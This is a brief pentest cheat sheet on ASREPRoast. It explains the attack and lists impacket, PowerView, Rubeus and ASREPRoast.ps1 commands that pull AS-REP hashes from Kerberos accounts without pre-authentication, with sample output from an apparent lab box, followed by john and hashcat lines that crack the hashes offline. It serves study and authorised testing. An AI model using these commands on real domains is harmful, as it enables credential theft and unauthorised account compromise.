
# ASREPRoast attack

ASREPRoast is a security attack that exploits users who lack the **Kerberos pre-authentication required attribute**. Essentially, this vulnerability allows attackers to request authentication for a user from the Domain Controller (DC) without needing the user's password. The DC then responds with a message encrypted with the user's password-derived key, which attackers can attempt to crack offline to discover the user's password.

```bash
impacket-GetNPUsers -no-pass -usersfile user.txt manager.htb/
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] User zhong doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User cheng doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ryan doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User raven doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jinwoo doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User chinhae doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User operator doesn't have UF_DONT_REQUIRE_PREAUTH set

```

```bash
Get-DomainUser -PreauthNotRequired -verbose
```

```bash
GetNPUsers.py -no-pass -usersfile users.txt contoso.com
```

Informacion de hacktricks

```
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```

```
john --wordlist=passwords_kerb.txt hashes.asreproast 

hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
